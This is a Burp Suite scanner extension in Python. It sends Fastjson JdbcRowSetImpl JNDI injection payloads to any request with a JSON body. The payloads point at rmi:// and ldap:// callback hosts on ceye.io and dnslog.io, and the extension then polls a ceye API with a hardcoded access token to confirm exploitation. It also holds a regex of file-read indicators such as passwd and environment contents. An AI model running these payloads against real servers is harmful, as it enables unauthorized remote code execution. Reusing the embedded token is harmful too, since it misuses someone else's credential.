#!/usr/bin/env python
# -*- coding:utf-8 -*-
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2019/10/22 15:41
# @Author  : xiaodong
# @github  : https://github.com/dongfangyuxiao/
# @Site    : #编写这个插件测试是否存在任意文件读取和下载漏洞
# @File    : burp_LFI.py
# @Software: PyCharm
import threading
import re
from burp import IBurpExtender
from burp import IHttpListener
from burp import IHttpRequestResponse
from burp import IResponseInfo
from burp import IRequestInfo
from burp import IHttpService
from burp import IScannerCheck
from burp import IScannerInsertionPointProvider
from burp import IParameter
from burp import IScanIssue
from urlparse import urlparse
from java.net import URL
import urllib2
import sys
sys.path.append('C:/Python27/Lib/site-packages')
import random
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  # 屏蔽ssl警告
class FuzzLFI:
    def __init__(self):
        # 这个里面定义各类paylaod，记得更换自己的dnslog地址
        self.fastjson = [
            '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://fastjson1.m4mta5.ceye.io","autoCommit":true}}',
            '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://fastjson2.m4mta5.ceye.io/Object","autoCommit":true}',
            '{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://fastjson3.m4mta5.ceye.io","autoCommit":true}}}',
            '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://fastjson1.dongfangyuxiao.l.dnslog.io","autoCommit":true}}',
            '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://fastjson2.dongfangyuxiao.l.dnslog.io/Object","autoCommit":true}',
            '{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://fastjson3.dongfangyuxiao.l.dnslog.io","autoCommit":true}}}'

        ]
        self.errorFlag = re.compile(r'.*(root:|sbin|uid=|State: R (running)|Tgid:|TracerPid:|Uid:|File does not exist:|emailusersbandwidth|adminuser=|database_prefix=|nologin|DB_NAME|daemon:|DOCUMENT_ROOT=|PATH="|HTTP_USER_AGENT|HTTP_ACCEPT_ENCODING=|apache_port=|cpanel/logs/access|allow_login_autocomplete|54289|6f3249aa304055d63828af3bfab778f6).*')

        self.dir2 = [



        ]

class BurpExtender(IBurpExtender,IScannerCheck):

    def registerExtenderCallbacks(self,callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.registerScannerCheck(self) #注册扫描插件
        self._callbacks.setExtensionName("SCAN")#定义插件的名称
        print("for body xxe fastjson scan")
        self.fuzzLFI = FuzzLFI()#引入上面定义的类
        self.dirList = []
    #以上都是标准化程序

    def doPassiveScan(self, baseRequestResponse):
        lfiTarget = []

        Request = baseRequestResponse.getRequest()
        Response = baseRequestResponse.getResponse()
        analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters= self.get_request_info(Request )

        ResHeaders, ResBodys, ResStatusCode,resLength= self.get_response_info(Response)
        httpService = baseRequestResponse.getHttpService()
        host, port, protocol, ishttps, = self.get_server_info(httpService)
        jsonFlag = False
        xxeBodyFlag = False
        heaers = {
        }
        strheders = ",".join(reqHeaders)
        if ("{" in reqBodys) or ("json" in strheders):
            jsonFlag = True
        if ("?xml" in reqBodys) or ("xml" in strheders or "*/*" in strheders):
            xxeBodyFlag = True
        url = self.get_request_url(protocol, reqHeaders,host,port)
        newHeaders = reqHeaders[2:]
        for header in newHeaders:
            heaers[header.split(':')[0]] = ":".join(header.split(':')[1:]).replace(" ", "")
        if (1==1):#多级或单级或类似baidu.net.cn的形势取主域名字段，比对是否在目标列表中
            if jsonFlag:


                tjsonBody = threading.Thread(target=self.fastjson, args=(
                    url, heaers, host))

                tjsonBody2 = threading.Thread(target=self.fastjson2, args=(
                    url, heaers, host))
                lfiTarget.append(tjsonBody)
                lfiTarget.append(tjsonBody2)

        for x in lfiTarget:
            x.start()
        for x in lfiTarget:
            x.join()

    def consolidateDuplicateIssues(self, existingIssue, newIssue):

        return 0

    def doActiveScan(self, baseRequestResponse, insertionPoint):
            # report the issue
            return None


    def ceyeFin(self):
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',
                    'Content-Type': 'application/json; charset=utf-8'}
        url = 'http://api.ceye.io/v1/records?token=23715ab222a6e221916405658caf5061&type=dns'
        response = requests.get(url,headers =headers,timeout=15).text
        return response




    def fastjson(self, url, heaers, host):

        for payload in self.fuzzLFI.fastjson:
            try:
                fastjson1 = requests.post(url, headers=heaers, timeout=5, data=payload, verify=False)
            except Exception as e:

                pass
            pattern = re.compile('fastjson')
            response = self.ceyeFin()
            result = pattern.findall(response)
            #print response
            #print result
            if result:

                content = '[+]{} -> {}\n[Headers] -> {}\n[Bodys] -> {}'.format('[fastjson Body GET]', url, heaers,
                                                                               payload)
                print (content)
                self.save(content + '\t\n')
                print ('-' * 50)
        # 获取响应的一些信息：响应头，响应内容，响应状态码

    def fastjson2(self, url, heaers, host):

        for payload in self.fuzzLFI.fastjson:
            try:
                fastjson1 = requests.post(url, headers=heaers, timeout=5, data=payload, verify=False)
            except Exception as e:

                pass

    def get_response_info(self, response):
        analyzedResponse = self._helpers.analyzeResponse(
            response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。
        resHeaders = analyzedResponse.getHeaders()  # getHeaders方法用于获取响应中包含的HTTP标头。返回：响应中包含的HTTP标头。
        resBodys = response[
                   analyzedResponse.getBodyOffset():].tostring()  # getBodyOffset方法用于获取消息正文开始的响应中的偏移量。返回：消息正文开始的响应中的偏移量。response[analyzedResponse.getBodyOffset():]获取正文内容
        resStatusCode = analyzedResponse.getStatusCode()  # getStatusCode获取响应中包含的HTTP状态代码。返回：响应中包含的HTTP状态代码。
        resLength = len(resBodys)
        return resHeaders, resBodys, resStatusCode, resLength

        # 获取服务端的信息，主机地址，端口，协议
    def get_server_info(self, httpService):
        host = httpService.getHost()
        port = httpService.getPort()
        protocol = httpService.getProtocol()
        ishttps = False
        if protocol == 'https':
            ishttps = True
        return host, port, protocol, ishttps

        # 获取请求的参数名、参数值、参数类型（get、post、cookie->用来构造参数时使用）
    def get_parameter_Name_Value_Type(self, parameter):
        parameterName = parameter.getName()
        parameterValue = parameter.getValue()
        parameterType = parameter.getType()
        return parameterName, parameterValue, parameterType



    def get_request_url(self, protocol, reqHeaders, host, port):
        link = reqHeaders[0].split(' ')[1]
        # host = reqHeaders[1].split(' ')[1]#忽略了如果json类型中，列表一不是host的情况，改变为
        if link.startswith('http'):
            return link
        else:
            return protocol + '://' + host + ":" + str(port) + link

    # 保存结果
    def save(self, content):
        #print(content)
        f = open('burp_scan.txt', 'at')
        f.writelines(content + '\n\n')
        f.close()

    def saveUrl(self, content):
        #print(content)
        f = open('burp_url.txt', 'at')
        f.writelines(content + '\n\n')
        f.close()

    def get_request_info(self, request):
        analyzedRequest = self._helpers.analyzeRequest(
            request)  # analyzeRequest用于分析HTTP请求，并获取有关它的各种关键详细信息。生成的IRequestInfo对象
        reqHeaders = analyzedRequest.getHeaders()  # 用于获取请求中包含的HTTP头。返回：请求中包含的HTTP标头。
        reqBodys = request[analyzedRequest.getBodyOffset():].tostring()  # 获取消息正文开始的请求中的偏移量。返回：消息正文开始的请求中的偏移量。
        reqMethod = analyzedRequest.getMethod()  # 获取请求方法
        reqParameters = analyzedRequest.getParameters()
        return analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters


